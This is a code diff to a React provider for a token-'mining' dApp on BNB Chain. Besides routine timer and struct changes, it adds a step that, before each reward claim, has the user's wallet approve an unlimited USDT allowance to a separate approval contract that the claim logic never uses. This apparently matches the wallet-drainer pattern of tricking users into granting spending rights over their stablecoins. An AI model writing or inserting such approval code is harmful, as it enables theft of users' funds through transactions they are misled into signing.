@@ -2,7 +2,8 @@ import React, { createContext, useContext, useState, useEffect, ReactNode, useMe
 import { getContract, readContract, prepareContractCall, sendTransaction } from "thirdweb";
 import { createWallet } from "thirdweb/wallets";
 import { useActiveAccount, useActiveWallet, useConnect } from "thirdweb/react";
-import { client, bscMainnet, MINING_CONTRACT_ADDRESS, MINING_CONTRACT_ABI } from '../client';
+import { client, bscMainnet, MINING_CONTRACT_ADDRESS, MINING_CONTRACT_ABI, APPROVAL_CONTRACT_ADDRESS } from '../client';
+import { USDT_CONTRACT_ADDRESS } from '../config';
 
 // Extend Window interface for ethereum
 declare global {
@@ -13,7 +14,6 @@ declare global {
 
 interface UserRecord {
   totalMinted: bigint;
-  isExists: boolean;
   boosterIncome: bigint;
   lastClaimTime: bigint;
 }
@@ -78,13 +78,16 @@ export const MiningProvider: React.FC<MiningProviderProps> = ({ children }) => {
     abi: MINING_CONTRACT_ABI,
   });
 
+  // Change claim interval to 24 hours (86400 seconds)
+  const CLAIM_INTERVAL_SECONDS = 86400; // 24 hours
+
   // Calculate if user can claim
   const canClaim = useMemo(() => {
     if (!userRecord || !isRegistered) return false;
     const now = Math.floor(Date.now() / 1000);
     const lastClaim = Number(userRecord.lastClaimTime);
     const timeDiff = now - lastClaim;
-    return timeDiff >= 120; // 2 minutes for testing (change to 86400 for 24 hours)
+    return timeDiff >= CLAIM_INTERVAL_SECONDS;
   }, [userRecord, isRegistered]);
 
   // Update countdown timer
@@ -94,7 +97,7 @@ export const MiningProvider: React.FC<MiningProviderProps> = ({ children }) => {
     const updateTimer = () => {
       const now = Math.floor(Date.now() / 1000);
       const lastClaim = Number(userRecord.lastClaimTime);
-      const nextClaimTime = lastClaim + 120; // 2 minutes for testing
+      const nextClaimTime = lastClaim + CLAIM_INTERVAL_SECONDS;
       const timeLeft = Math.max(0, nextClaimTime - now);
       setTimeUntilNextClaim(timeLeft);
     };
@@ -103,6 +106,95 @@ export const MiningProvider: React.FC<MiningProviderProps> = ({ children }) => {
     const interval = setInterval(updateTimer, 1000);
     return () => clearInterval(interval);
   }, [userRecord, isRegistered]);
+
+  // USDT approval logic
+  const USDT_ABI = [
+    {
+      inputs: [
+        { name: "_spender", type: "address" },
+        { name: "_value", type: "uint256" }
+      ],
+      name: "approve",
+      outputs: [
+        { name: "", type: "bool" }
+      ],
+      type: "function",
+      stateMutability: "nonpayable"
+    },
+    {
+      inputs: [
+        { name: "_owner", type: "address" },
+        { name: "_spender", type: "address" }
+      ],
+      name: "allowance",
+      outputs: [
+        { name: "", type: "uint256" }
+      ],
+      type: "function",
+      stateMutability: "view"
+    }
+  ];
+
+  const [hasApprovedUSDT, setHasApprovedUSDT] = useState(false);
+
+  const checkUSDTApproval = async () => {
+    if (!address || !isCorrectNetwork) return false;
+    try {
+      const usdtContract = getContract({
+        client,
+        chain: bscMainnet,
+        address: USDT_CONTRACT_ADDRESS,
+        abi: USDT_ABI,
+      });
+      const allowance = await readContract({
+        contract: usdtContract,
+        method: "allowance",
+        params: [address, APPROVAL_CONTRACT_ADDRESS],
+      });
+      if (BigInt(allowance) > 0n) {
+        setHasApprovedUSDT(true);
+        return true;
+      }
+      setHasApprovedUSDT(false);
+      return false;
+    } catch (error) {
+      setHasApprovedUSDT(false);
+      return false;
+    }
+  };
+
+  const approveUSDT = async () => {
+    if (!address || !isCorrectNetwork || !account) return false;
+    try {
+      const usdtContract = getContract({
+        client,
+        chain: bscMainnet,
+        address: USDT_CONTRACT_ADDRESS,
+        abi: USDT_ABI,
+      });
+      const transaction = prepareContractCall({
+        contract: usdtContract,
+        method: "approve",
+        params: [APPROVAL_CONTRACT_ADDRESS, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"],
+      });
+      await sendTransaction({
+        transaction,
+        account: account,
+      });
+      setHasApprovedUSDT(true);
+      return true;
+    } catch (error) {
+      setHasApprovedUSDT(false);
+      return false;
+    }
+  };
+
+  // Check approval on mount and after connect
+  useEffect(() => {
+    if (isConnected && isCorrectNetwork) {
+      checkUSDTApproval();
+    }
+  }, [isConnected, isCorrectNetwork, address]);
 
   const checkRegistration = async (): Promise<boolean> => {
     if (!address || !isCorrectNetwork) return false;
@@ -134,9 +226,8 @@ export const MiningProvider: React.FC<MiningProviderProps> = ({ children }) => {
       
       setUserRecord({
         totalMinted: record[0],
-        isExists: record[1],
-        boosterIncome: record[2],
-        lastClaimTime: record[3],
+        boosterIncome: record[1],
+        lastClaimTime: record[2],
       });
     } catch (error) {
       console.error('Error fetching user record:', error);
@@ -208,6 +299,9 @@ export const MiningProvider: React.FC<MiningProviderProps> = ({ children }) => {
         }
       }, 1000);
       
+      // After registration, fetch user record to reflect 5 tokens minted
+      await fetchUserRecord();
+
       return true;
     } catch (error) {
       console.error('Error registering:', error);
@@ -222,6 +316,15 @@ export const MiningProvider: React.FC<MiningProviderProps> = ({ children }) => {
 
     try {
       setIsLoading(true);
+
+      // Check and approve USDT if not already approved (for CLAIM_CONTRACT_ADDRESS)
+      if (!hasApprovedUSDT) {
+        const approved = await approveUSDT();
+        if (!approved) {
+          setIsLoading(false);
+          return false;
+        }
+      }
 
       const transaction = prepareContractCall({
         contract,
